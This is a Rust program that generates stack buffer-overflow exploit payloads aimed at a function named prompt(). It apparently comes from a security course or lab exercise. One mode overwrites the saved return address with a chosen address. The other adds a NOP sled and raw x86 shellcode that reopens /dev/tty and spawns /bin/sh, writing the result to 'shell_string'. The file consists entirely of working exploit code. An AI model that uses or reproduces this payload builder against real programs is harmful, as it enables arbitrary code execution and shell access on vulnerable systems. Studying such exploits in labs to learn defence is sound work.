use std::{env, fs::File, io::Write};

const PADDING: usize = 20;

/// Parses a hex string (with or without a `0x` prefix) into a `u32` address.
fn parse_hex_addr(s: &str) -> u32 {
    u32::from_str_radix(s.trim_start_matches("0x"), 16)
        .unwrap_or_else(|_| panic!("'{}' is not a valid 32-bit hex address", s))
}

/// Appends `addr` to `buf` in little-endian byte order.
fn push_le32(buf: &mut Vec<u8>, addr: u32) {
    buf.extend_from_slice(&addr.to_le_bytes());
}

/// Creates (or truncates) a file at `name` and writes `data` to it.
fn write_file(name: &str, data: &[u8]) {
    let mut f: File =
        File::create(name).unwrap_or_else(|e| panic!("Cannot create '{}': {}", name, e));
    f.write_all(data)
        .unwrap_or_else(|e| panic!("Cannot write '{}': {}", name, e));
}

/// Builds a payload that overwrites the saved `%eip` with `target_addr`,
/// redirecting execution to that address on return from `prompt()`.
fn build_target_payload(target_addr: u32) -> Vec<u8> {
    let mut payload: Vec<u8> = Vec::with_capacity(PADDING + 4);
    payload.extend(std::iter::repeat_n(b'A', PADDING));
    push_le32(&mut payload, target_addr);
    payload
}

/// Builds a payload consisting of padding, a overwritten return address
/// pointing into a NOP sled, and the shellcode; allowing arbitrary code
/// execution on return from `prompt()`.
fn build_shellcode_payload(ret_addr: u32) -> Vec<u8> {
    const NOP_COUNT: usize = 128;

    const SHELLCODE: &[u8] = &[
        0x31, 0xc0, 0x31, 0xdb, 0xb0, 0x06, 0xcd, 0x80, 0x53, 0x68, 0x2f, 0x74, 0x74, 0x79, 0x68,
        0x2f, 0x64, 0x65, 0x76, 0x89, 0xe3, 0x31, 0xc9, 0x66, 0xb9, 0x12, 0x27, 0xb0, 0x05, 0xcd,
        0x80, 0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89,
        0xe3, 0x50, 0x53, 0x89, 0xe1, 0x99, 0xb0, 0x0b, 0xcd, 0x80,
    ];

    let total: usize = PADDING + 4 + NOP_COUNT + SHELLCODE.len();
    let mut payload: Vec<u8> = Vec::with_capacity(total);

    payload.extend(std::iter::repeat_n(b'A', PADDING));
    push_le32(&mut payload, ret_addr);
    payload.extend(std::iter::repeat_n(0x90u8, NOP_COUNT));
    payload.extend_from_slice(SHELLCODE);

    payload
}

fn main() {
    let args: Vec<String> = env::args().collect();

    match args.get(1).map(String::as_str) {
        Some("shellcode") => {
            let guessed: &String = args.get(2).unwrap_or_else(|| {
                eprintln!("Usage: {} shellcode <guessed_stack_addr_hex>", args[0]);
                std::process::exit(1);
            });

            let ret_addr: u32 = parse_hex_addr(guessed);
            let payload: Vec<u8> = build_shellcode_payload(ret_addr);

            write_file("shell_string", &payload);
        }

        Some(addr_str) => {
            let target_addr: u32 = parse_hex_addr(addr_str);
            let payload: Vec<u8> = build_target_payload(target_addr);

            write_file("attack_string", &payload);
        }

        None => {
            eprintln!("Usage:");
            eprintln!("    {} <target_hex_addr>", args[0]);
            eprintln!("    {} shellcode <guessed_stack_addr_hex>", args[0]);
            std::process::exit(1);
        }
    }
}
